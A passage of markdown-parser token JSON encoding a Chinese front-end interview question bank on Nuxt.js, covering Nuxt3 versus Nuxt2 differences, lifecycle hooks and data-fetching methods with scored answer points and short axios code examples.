API：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。","text":"\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","text":"\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","escaped":false}]}]},{"type":"list_item","raw":"* **2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","task":false,"loose":false,"text":"**2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","tokens":[{"type":"text","raw":"**2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","text":"**2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Server - side Rendering (SSR) 和 Static Site Generation (SSG)：","text":" Server - side Rendering (SSR) 和 Static Site Generation (SSG)：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。","text":"\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","text":"\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## Nuxt.js的生命周期有哪些？\\n\\n","depth":2,"text":"Nuxt.js的生命周期有哪些？","tokens":[{"type":"text","raw":"Nuxt.js的生命周期有哪些？","text":"Nuxt.js的生命周期有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"* **1：** 服务器端生命周期：\\n  + nuxtServerInit：在服务端初始化数据\\n  + middleware：中间件执行\\n  + validate()：验证动态路由参数\\n  + asyncData()：异步数据加载\\n  + fetch()：服务端数据获取\\n\\n* **1：** Vue生命周期（服务端）：\\n  + beforeCreate：组件实例化之前\\n  + created：组件创建完成\\n\\n* **1：** Vue生命周期（客户端）：\\n  + beforeMount：DOM挂载之前\\n  + mounted：DOM挂载完成\\n  + beforeUpdate：数据更新前\\n  + updated：数据更新后\\n\\n* **1：** 页面特定钩子：\\n  + transition：页面过渡效果\\n  + head：设置页面元信息\\n\\n* **1：** 注意事项：\\n  + 服务端只能访问beforeCreate和created\\n  + window/document只能在mounted中使用\\n  + asyncData/fetch在每次路由变化时都会调用","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** 服务器端生命周期：\\n  + nuxtServerInit：在服务端初始化数据\\n  + middleware：中间件执行\\n  + validate()：验证动态路由参数\\n  + asyncData()：异步数据加载\\n  + fetch()：服务端数据获取\\n\\n","task":false,"loose":true,"text":"**1：** 服务器端生命周期：\\n+ nuxtServerInit：在服务端初始化数据\\n+ middleware：中间件执行\\n+ validate()：验证动态路由参数\\n+ asyncData()：异步数据加载\\n+ fetch()：服务端数据获取\\n","tokens":[{"type":"text","raw":"**1：** 服务器端生命周期：\\n","text":"**1：** 服务器端生命周期：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端生命周期：","text":" 服务器端生命周期：","escaped":false}]},{"type":"list","raw":"+ nuxtServerInit：在服务端初始化数据\\n+ middleware：中间件执行\\n+ validate()：验证动态路由参数\\n+ asyncData()：异步数据加载\\n+ fetch()：服务端数据获取\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ nuxtServerInit：在服务端初始化数据\\n","task":false,"loose":false,"text":"nuxtServerInit：在服务端初始化数据","tokens":[{"type":"text","raw":"nuxtServerInit：在服务端初始化数据","text":"nuxtServerInit：在服务端初始化数据","tokens":[{"type":"text","raw":"nuxtServerInit：在服务端初始化数据","text":"nuxtServerInit：在服务端初始化数据","escaped":false}]}]},{"type":"list_item","raw":"+ middleware：中间件执行\\n","task":false,"loose":false,"text":"middleware：中间件执行","tokens":[{"type":"text","raw":"middleware：中间件执行","text":"middleware：中间件执行","tokens":[{"type":"text","raw":"middleware：中间件执行","text":"middleware：中间件执行","escaped":false}]}]},{"type":"list_item","raw":"+ validate()：验证动态路由参数\\n","task":false,"loose":false,"text":"validate()：验证动态路由参数","tokens":[{"type":"text","raw":"validate()：验证动态路由参数","text":"validate()：验证动态路由参数","tokens":[{"type":"text","raw":"validate()：验证动态路由参数","text":"validate()：验证动态路由参数","escaped":false}]}]},{"type":"list_item","raw":"+ asyncData()：异步数据加载\\n","task":false,"loose":false,"text":"asyncData()：异步数据加载","tokens":[{"type":"text","raw":"asyncData()：异步数据加载","text":"asyncData()：异步数据加载","tokens":[{"type":"text","raw":"asyncData()：异步数据加载","text":"asyncData()：异步数据加载","escaped":false}]}]},{"type":"list_item","raw":"+ fetch()：服务端数据获取","task":false,"loose":false,"text":"fetch()：服务端数据获取","tokens":[{"type":"text","raw":"fetch()：服务端数据获取","text":"fetch()：服务端数据获取","tokens":[{"type":"text","raw":"fetch()：服务端数据获取","text":"fetch()：服务端数据获取","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** Vue生命周期（服务端）：\\n  + beforeCreate：组件实例化之前\\n  + created：组件创建完成\\n\\n","task":false,"loose":true,"text":"**1：** Vue生命周期（服务端）：\\n+ beforeCreate：组件实例化之前\\n+ created：组件创建完成\\n","tokens":[{"type":"text","raw":"**1：** Vue生命周期（服务端）：\\n","text":"**1：** Vue生命周期（服务端）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vue生命周期（服务端）：","text":" Vue生命周期（服务端）：","escaped":false}]},{"type":"list","raw":"+ beforeCreate：组件实例化之前\\n+ created：组件创建完成\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ beforeCreate：组件实例化之前\\n","task":false,"loose":false,"text":"beforeCreate：组件实例化之前","tokens":[{"type":"text","raw":"beforeCreate：组件实例化之前","text":"beforeCreate：组件实例化之前","tokens":[{"type":"text","raw":"beforeCreate：组件实例化之前","text":"beforeCreate：组件实例化之前","escaped":false}]}]},{"type":"list_item","raw":"+ created：组件创建完成","task":false,"loose":false,"text":"created：组件创建完成","tokens":[{"type":"text","raw":"created：组件创建完成","text":"created：组件创建完成","tokens":[{"type":"text","raw":"created：组件创建完成","text":"created：组件创建完成","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** Vue生命周期（客户端）：\\n  + beforeMount：DOM挂载之前\\n  + mounted：DOM挂载完成\\n  + beforeUpdate：数据更新前\\n  + updated：数据更新后\\n\\n","task":false,"loose":true,"text":"**1：** Vue生命周期（客户端）：\\n+ beforeMount：DOM挂载之前\\n+ mounted：DOM挂载完成\\n+ beforeUpdate：数据更新前\\n+ updated：数据更新后\\n","tokens":[{"type":"text","raw":"**1：** Vue生命周期（客户端）：\\n","text":"**1：** Vue生命周期（客户端）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vue生命周期（客户端）：","text":" Vue生命周期（客户端）：","escaped":false}]},{"type":"list","raw":"+ beforeMount：DOM挂载之前\\n+ mounted：DOM挂载完成\\n+ beforeUpdate：数据更新前\\n+ updated：数据更新后\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ beforeMount：DOM挂载之前\\n","task":false,"loose":false,"text":"beforeMount：DOM挂载之前","tokens":[{"type":"text","raw":"beforeMount：DOM挂载之前","text":"beforeMount：DOM挂载之前","tokens":[{"type":"text","raw":"beforeMount：DOM挂载之前","text":"beforeMount：DOM挂载之前","escaped":false}]}]},{"type":"list_item","raw":"+ mounted：DOM挂载完成\\n","task":false,"loose":false,"text":"mounted：DOM挂载完成","tokens":[{"type":"text","raw":"mounted：DOM挂载完成","text":"mounted：DOM挂载完成","tokens":[{"type":"text","raw":"mounted：DOM挂载完成","text":"mounted：DOM挂载完成","escaped":false}]}]},{"type":"list_item","raw":"+ beforeUpdate：数据更新前\\n","task":false,"loose":false,"text":"beforeUpdate：数据更新前","tokens":[{"type":"text","raw":"beforeUpdate：数据更新前","text":"beforeUpdate：数据更新前","tokens":[{"type":"text","raw":"beforeUpdate：数据更新前","text":"beforeUpdate：数据更新前","escaped":false}]}]},{"type":"list_item","raw":"+ updated：数据更新后","task":false,"loose":false,"text":"updated：数据更新后","tokens":[{"type":"text","raw":"updated：数据更新后","text":"updated：数据更新后","tokens":[{"type":"text","raw":"updated：数据更新后","text":"updated：数据更新后","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** 页面特定钩子：\\n  + transition：页面过渡效果\\n  + head：设置页面元信息\\n\\n","task":false,"loose":true,"text":"**1：** 页面特定钩子：\\n+ transition：页面过渡效果\\n+ head：设置页面元信息\\n","tokens":[{"type":"text","raw":"**1：** 页面特定钩子：\\n","text":"**1：** 页面特定钩子：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 页面特定钩子：","text":" 页面特定钩子：","escaped":false}]},{"type":"list","raw":"+ transition：页面过渡效果\\n+ head：设置页面元信息\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ transition：页面过渡效果\\n","task":false,"loose":false,"text":"transition：页面过渡效果","tokens":[{"type":"text","raw":"transition：页面过渡效果","text":"transition：页面过渡效果","tokens":[{"type":"text","raw":"transition：页面过渡效果","text":"transition：页面过渡效果","escaped":false}]}]},{"type":"list_item","raw":"+ head：设置页面元信息","task":false,"loose":false,"text":"head：设置页面元信息","tokens":[{"type":"text","raw":"head：设置页面元信息","text":"head：设置页面元信息","tokens":[{"type":"text","raw":"head：设置页面元信息","text":"head：设置页面元信息","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** 注意事项：\\n  + 服务端只能访问beforeCreate和created\\n  + window/document只能在mounted中使用\\n  + asyncData/fetch在每次路由变化时都会调用","task":false,"loose":true,"text":"**1：** 注意事项：\\n+ 服务端只能访问beforeCreate和created\\n+ window/document只能在mounted中使用\\n+ asyncData/fetch在每次路由变化时都会调用","tokens":[{"type":"text","raw":"**1：** 注意事项：\\n","text":"**1：** 注意事项：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 注意事项：","text":" 注意事项：","escaped":false}]},{"type":"list","raw":"+ 服务端只能访问beforeCreate和created\\n+ window/document只能在mounted中使用\\n+ asyncData/fetch在每次路由变化时都会调用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 服务端只能访问beforeCreate和created\\n","task":false,"loose":false,"text":"服务端只能访问beforeCreate和created","tokens":[{"type":"text","raw":"服务端只能访问beforeCreate和created","text":"服务端只能访问beforeCreate和created","tokens":[{"type":"text","raw":"服务端只能访问beforeCreate和created","text":"服务端只能访问beforeCreate和created","escaped":false}]}]},{"type":"list_item","raw":"+ window/document只能在mounted中使用\\n","task":false,"loose":false,"text":"window/document只能在mounted中使用","tokens":[{"type":"text","raw":"window/document只能在mounted中使用","text":"window/document只能在mounted中使用","tokens":[{"type":"text","raw":"window/document只能在mounted中使用","text":"window/document只能在mounted中使用","escaped":false}]}]},{"type":"list_item","raw":"+ asyncData/fetch在每次路由变化时都会调用","task":false,"loose":false,"text":"asyncData/fetch在每次路由变化时都会调用","tokens":[{"type":"text","raw":"asyncData/fetch在每次路由变化时都会调用","text":"asyncData/fetch在每次路由变化时都会调用","tokens":[{"type":"text","raw":"asyncData/fetch在每次路由变化时都会调用","text":"asyncData/fetch在每次路由变化时都会调用","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Nuxt.js中的数据获取方式有哪些？\\n\\n","depth":2,"text":"Nuxt.js中的数据获取方式有哪些？","tokens":[{"type":"text","raw":"Nuxt.js中的数据获取方式有哪些？","text":"Nuxt.js中的数据获取方式有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"* **1：** asyncData方法：\\n  + 在组件初始化前调用\\n  + 可以返回Promise\\n  + 返回的数据会合并到组件data中\\n  + 只能在页面组件中使用\\n\\n  ```js\\n  async asyncData({ $axios }) {\\n    const data = await $axios.$get(\'/api/data\')\\n    return { data }\\n  }\\n  ```\\n\\n* **1：** fetch方法：\\n  + 可在任何组件中使用\\n  + 不直接返回数据\\n  + 通常用于填充Vuex状态\\n\\n  ```js\\n  async fetch() {\\n    const { data } = await this.$axios.$get(\'/api/data\')\\n    this.items = data\\n  }\\n  ```\\n\\n* **1：** Vuex操作：\\n  + nuxtServerInit初始化存储\\n  + store中的actions获取数据\\n  + 支持模块化管理\\n\\n  ```js\\n  export const actions = {\\n    async fetchData({ commit }) {\\n      const data = await this.$axios.$get(\'/api/data\')\\n      commit(\'SET_DATA\', data)\\n    }\\n  }\\n  ```\\n\\n* **1：** API调用最佳实践：\\n  + 使用@nuxtjs/axios模块\\n  + 统一管理API请求\\n  + 处理错误和加载状态\\n  + 实现数据缓存策略","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** asyncData方法：\\n  + 在组件初始化前调用\\n  + 可以返回Promise\\n  + 返回的数据会合并到组件data中\\n  + 只能在页面组件中使用\\n\\n  ```js\\n  async asyncData({ $axios }) {\\n    const data = await $axios.$get(\'/api/data\')\\n    return { data }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** asyncData方法：\\n+ 在组件初始化前调用\\n+ 可以返回Promise\\n+ 返回的数据会合并到组件data中\\n+ 只能在页面组件中使用\\n\\n```js\\nasync asyncData({ $axios }) {\\n  const data = await $axios.$get(\'/api/data\')\\n  return { data }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** asyncData方法：\\n","text":"**1：** asyncData方法：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" asyncData方法：","text":" asyncData方法：","escaped":false}]},{"type":"list","raw":"+ 在组件初始化前调用\\n+ 可以返回Promise\\n+ 返回的数据会合并到组件data中\\n+ 只能在页面组件中使用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 在组件初始化前调用\\n","task":false,"loose":false,"text":"在组件初始化前调用","tokens":[{"type":"text","raw":"在组件初始化前调用","text":"在组件初始化前调用","tokens":[{"type":"text","raw":"在组件初始化前调用","text":"在组件初始化前调用","escaped":false}]}]},{"type":"list_item","raw":"+ 可以返回Promise\\n","task":false,"loose":false,"text":"可以返回Promise","tokens":[{"type":"text","raw":"可以返回Promise","text":"可以返回Promise","tokens":[{"type":"text","raw":"可以返回Promise","text":"可以返回Promise","escaped":false}]}]},{"type":"list_item","raw":"+ 返回的数据会合并到组件data中\\n","task":false,"loose":false,"text":"返回的数据会合并到组件data中","tokens":[{"type":"text","raw":"返回的数据会合并到组件data中","text":"返回的数据会合并到组件data中","tokens":[{"type":"text","raw":"返回的数据会合并到组件data中","text":"返回的数据会合并到组件data中","escaped":false}]}]},{"type":"list_item","raw":"+ 只能在页面组件中使用","task":false,"loose":false,"text":"只能在页面组件中使用","tokens":[{"type":"text","raw":"只能在页面组件中使用","text":"只能在页面组件中使用","tokens":[{"type":"text","raw":"只能在页面组件中使用","text":"只能在页面组件中使用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nasync asyncData({ $axios }) {\\n  const data = await $axios.$get(\'/api/data\')\\n  return { data }\\n}\\n```\\n","lang":"js","text":"async asyncData({ $axios }) {\\n  const data = await $axios.$get(\'/api/data\')\\n  return { data }\\n}"}]},{"type":"list_item","raw":"* **1：** fetch方法：\\n  + 可在任何组件中使用\\n  + 不直接返回数据\\n  + 通常用于填充Vuex状态\\n\\n  ```js\\n  async fetch() {\\n    const { data } = await this.$axios.$get(\'/api/data\')\\n    this.items = data\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** fetch方法：\\n+ 可在任何组件中使用\\n+ 不直接返回数据\\n+ 通常用于填充Vuex状态\\n\\n```js\\nasync fetch() {\\n  const { data } = await this.$axios.$get(\'/api/data\')\\n  this.items = data\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** fetch方法：\\n","text":"**1：** fetch方法：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" fetch方法：","text":" fetch方法：","escaped":false}]},{"type":"list","raw":"+ 可在任何组件中使用\\n+ 不直接返回数据\\n+ 通常用于填充Vuex状态","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 可在任何组件中使用\\n","task":false,"loose":false,"text":"可在任何组件中使用","tokens":[{"type":"text","raw":"可在任何组件中使用","text":"可在任何组件中使用","tokens":[{"type":"text","raw":"可在任何组件中使用","text":"可在任何组件中使用","escaped":false}]}]},{"type":"list_item","raw":"+ 不直接返回数据\\n","task":false,"loose":false,"text":"不直接返回数据","tokens":[{"type":"text","raw":"不直接返回数据","text":"不直接返回数据","tokens":[{"type":"text","raw":"不直接返回数据","text":"不直接返回数据","escaped":false}]}]},{"type":"list_item","raw":"+ 通常用于填充Vuex状态","task":false,"loose":false,"text":"通常用于填充Vuex状态","tokens":[{"type":"text","raw":"通常用于填充Vuex状态","text":"通常用于填充Vuex状态","tokens":[{"type":"text","raw":"通常用于填充Vuex状态","text":"通常用于填充Vuex状态","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nasync fetch() {\\n  const { data } = await this.$axios.$get(\'/api/data\')\\n  this.items = data\\n}\\n```\\n","lang":"js","text":"async fetch() {\\n  const { data } = await this.$axios.$get(\'/api/data\')\\n  this.items = data\\n}"}]},{"type":"list_item","raw":"* **1：** Vuex操作：\\n  + nuxtServerInit初始化存储\\n  + store中的actions获取数据\\n  + 支持模块化管理\\n\\n  ```js\\n  export const actions = {\\n    async fetchData({ commit }) {\\n      const data = await this.$axios.$get(\'/api/data\')\\n      commit(\'SET_DATA\', data)\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** Vuex操作：\\n+ nuxtServerInit初始化存储\\n+ store中的actions获取数据\\n+ 支持模块化管理\\n\\n```js\\nexport const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(\'/api/data\')\\n    commit(\'SET_DATA\', data)\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** Vuex操作：\\n","text":"**1：** Vuex操作：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vuex操作：","text":" Vuex操作：","escaped":false}]},{"type":"list","raw":"+ nuxtServerInit初始化存储\\n+ store中的actions获取数据\\n+ 支持模块化管理","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ nuxtServerInit初始化存储\\n","task":false,"loose":false,"text":"nuxtServerInit初始化存储","tokens":[{"type":"text","raw":"nuxtServerInit初始化存储","text":"nuxtServerInit初始化存储","tokens":[{"type":"text","raw":"nuxtServerInit初始化存储","text":"nuxtServerInit初始化存储","escaped":false}]}]},{"type":"list_item","raw":"+ store中的actions获取数据\\n","task":false,"loose":false,"text":"store中的actions获取数据","tokens":[{"type":"text","raw":"store中的actions获取数据","text":"store中的actions获取数据","tokens":[{"type":"text","raw":"store中的actions获取数据","text":"store中的actions获取数据","escaped":false}]}]},{"type":"list_item","raw":"+ 支持模块化管理","task":false,"loose":false,"text":"支持模块化管理","tokens":[{"type":"text","raw":"支持模块化管理","text":"支持模块化管理","tokens":[{"type":"text","raw":"支持模块化管理","text":"支持模块化管理","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nexport const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(\'/api/data\')\\n    commit(\'SET_DATA\', data)\\n  }\\n}\\n```\\n","lang":"js","text":"export const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(\'/api/data\')\\n    commit(\'SET_DATA\', data)\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** API调用最佳实践：\\n  + 使用@nuxtjs/axios模块\\n  + 统一管理API请求\\n  + 处理错误和加载状态\\n  + 实现数据缓存策略","task":false,"loose":true,"text":"**1：** API调用最佳实践：\\n+ 使用@nuxtjs/axios模块\\n+ 统一管理API请求\\n+ 处理错误和加载状态\\n+ 实现数据缓存策略","tokens":[{"type":"text","raw":"**1：** API调用最佳实践：\\n","text":"**1：** API调用最佳实践：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" API调用最佳实践：","text":" API调用最佳实践：","escaped":false}]},{"type":"list","raw":"+ 使用@nuxtjs/axios模块\\n+ 统一管理API请求\\n+ 处理错误和加载状态\\n+ 实现数据缓存策略","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用@nuxtjs/axios模块\\n","task":false,"loose":false,"text":"使用@nuxtjs/axios模块","tokens":[{"type":"text","raw":"使用@nuxtjs/axios模块","text":"使用@nuxtjs/axios模块","tokens":[{"type":"text","raw":"使用@nuxtjs/axios模块","text":"使用@nuxtjs/axios模块","escaped":false}]}]},{"type":"list_item","raw":"+ 统一管理API请求\\n","task":false,"loose":false,"text":"统一管理API请求","tokens":[{"type":"text","raw":"统一管理API请求","text":"统一管理API请求","tokens":[{"type":"text","raw":"统一管理API请求","text":"统一管理API请求","escaped":false}]}]},{"type":"list_item","raw":"+ 处理错误和加载状态\\n","task":false,"loose":false,"text":"处理错误和加载状态","tokens":[{"type":"text","raw":"处理错误和加载状态","text":"处理错误和加载状态","tokens":[{"type":"text","raw":"处理错误和加载状态","text":"处理错误和加载状态","escaped":false}]}]},{"type":"list_item","raw":"+ 实现数据缓存策略","task":false,"loose":false,"text":"实现数据缓存策略","tokens":[{"type":"text","raw":"实现数据缓存策略","text":"实现数据缓存策略","tokens":[{"type":"text","raw":"实现数据缓存策略","text":"实现数据缓存策略","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 